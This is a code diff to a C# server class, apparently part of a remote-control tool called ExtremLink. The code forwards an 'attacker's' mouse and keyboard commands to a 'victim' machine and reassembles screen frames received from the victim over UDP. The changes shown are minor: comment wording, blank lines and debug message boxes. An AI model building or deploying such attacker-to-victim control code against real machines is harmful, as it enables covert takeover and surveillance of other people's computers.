@@ -326,7 +326,7 @@ namespace ExtremLink_Server.Classes
             Log.LogInstance.AddMessage($"Attacker sent {data} command");
         }
 
-        // Handling attacker mouse commands messages function:
+        // Handling attacker's mouse commands messages function:
         private void HandleMouseMessages(string data)
         {
             // Input: A string which represents a message about mouse commands from the attacker.
@@ -334,7 +334,7 @@ namespace ExtremLink_Server.Classes
             this.victim.SendTCPMessageToClient("%", data);
         }
 
-        // Handling attacker keyboard commands messages function:
+        // Handling attacker's keyboard commands messages function:
         private void HandleKeyboardMessages(string data)
         {
             // Input: A string which represents a message about keyboard commands from the attacker.
@@ -358,8 +358,10 @@ namespace ExtremLink_Server.Classes
             {
                 // Buffer size for each packet
                 byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+
                 int bytesRead = this.victim.UdpSocket.Receive(buffer);
 
+                // MessageBox.Show("A udp pakcet was received by the server from the victim");
                 // Extract metadata
                 int receivedStreamId = BitConverter.ToInt32(buffer, 0);
                 int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
@@ -380,6 +382,7 @@ namespace ExtremLink_Server.Classes
                     receivedPackets[packetIndex] = segmentData;
                 }
             }
+
             using (var ms = new MemoryStream())
             {
                 for (int i = 0; i < totalPackets; i++)
@@ -393,6 +396,7 @@ namespace ExtremLink_Server.Classes
                         throw new Exception($"Missing packet {i}");
                     }
                 }
+                MessageBox.Show("A frame was received");
                 return ms.ToArray();
             }
         }
